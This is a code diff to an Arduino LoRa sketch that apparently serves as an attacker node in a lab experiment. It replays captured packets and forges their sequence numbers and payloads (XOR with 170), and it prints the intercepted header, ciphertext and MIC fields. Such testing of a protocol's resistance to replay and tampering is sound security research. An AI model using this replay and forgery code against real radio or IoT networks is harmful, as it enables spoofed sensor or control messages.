@@ -25,12 +25,14 @@
 //////////////////////////////////////////////
 // Variables
 
-bool replayAttack = false;
-bool forgeryAttack = true;
+bool replayAttack = true;
+bool forgeryAttack = false;
 
 uint8_t header_b1;
 uint8_t header_b2;
 uint8_t header_b3;
+uint16_t deviceAddress;
+uint16_t sequenceNum;
 uint16_t payload;
 uint8_t mic[4];
 
@@ -225,8 +227,6 @@ void onReceive(int packetSize) {
   if (packetSize == 0) return;          // if there's no packet, return
   //Serial.println("---------------------------------------");
   //Serial.println("Packet arrived");
-  uint16_t deviceAddress;
-  uint16_t sequenceNum;
   payload = 0;
 
   for (int i = 0; i < packetSize; i++) {
@@ -256,7 +256,7 @@ void onReceive(int packetSize) {
     }
   }
 
-  Serial.println("---------- Before decryption ----------");
+  Serial.println("------------ Packet recived ------------");
   Serial.print("Device address:   ");
   Serial.print(deviceAddress);
   Serial.println("\t\t\t|\t12 bits");
@@ -275,19 +275,18 @@ void onReceive(int packetSize) {
   Serial.print("\t\t|\t");
   Serial.print(sizeof(mic));
   Serial.println(" bytes");
-  Serial.print("Secret key:       ");
+  /*Serial.print("Secret key:       ");
   Serial.print("N/A");
-  Serial.println("\t\t\t|");
+  Serial.println("\t\t\t|");*/
   Serial.println("----------------------------------------");
 
   if (replayAttack && sequenceNum > 1) {
     delay(500);
-    Serial.println("..... Replaying .....");
+    Serial.println("----------- Replaying packet -----------");
     transmitMessage();
   }
   else if (forgeryAttack && sequenceNum > 1) {
     delay(500);
-    Serial.println("..... Forging .....");
     forgeMessage(1, sequenceNum, payload);                                 // param: 1 = sequence number, 2 = payload, 3 = both
   }
 
@@ -296,17 +295,22 @@ void onReceive(int packetSize) {
 void forgeMessage(uint16_t field, uint16_t seqNum, uint16_t pay) {
 
   if (field == 1) {                             // if forge sequence number
+    Serial.println("-------- Forging sequence number --------");
     uint16_t forgedSeqNum = seqNum + 2;
+    sequenceNum = forgedSeqNum;
     header_b2 &= 240;
     header_b2 ^= forgedSeqNum >> 8;
     header_b3 = forgedSeqNum;
   }
   else if (field == 2) {                        // if forge payload
+    Serial.println("------------ Forging payload ------------");
     uint16_t forgedPayload = pay ^ 170;
     payload = forgedPayload;
   }
   else if (field == 3) {                        // if forge both
+    Serial.println("-- Forging sequence number and payload --");
     uint16_t forgedSeqNum = seqNum + 2;
+    sequenceNum = forgedSeqNum;
     header_b2 &= 240;
     header_b2 ^= forgedSeqNum >> 8;
     header_b3 = forgedSeqNum;
@@ -321,6 +325,27 @@ void transmitMessage() {
 
   uint8_t payload_b1 = payload >> 8;
   uint8_t payload_b2 = payload;
+
+  Serial.print("Device address:   ");
+  Serial.print(deviceAddress);
+  Serial.println("\t\t\t|\t12 bits");
+  Serial.print("Sequence number:  ");
+  Serial.print(sequenceNum);
+  Serial.println("\t\t\t|\t12 bits");
+  Serial.print("Ciphertext:       ");
+  Serial.print(payload);
+  Serial.print("\t\t\t|\t");
+  Serial.print(sizeof(payload));
+  Serial.println(" bytes");
+  Serial.print("MIC:              ");
+  for (int i = 0; i < 4; i++) {
+    Serial.print(mic[i]);
+  }
+  Serial.print("\t\t|\t");
+  Serial.print(sizeof(mic));
+  Serial.println(" bytes");
+  Serial.println("----------------------------------------");
+  Serial.println();
 
   LoRa.beginPacket();              // beginPacket(implicitHeader = 1)
   LoRa.write(header_b1);
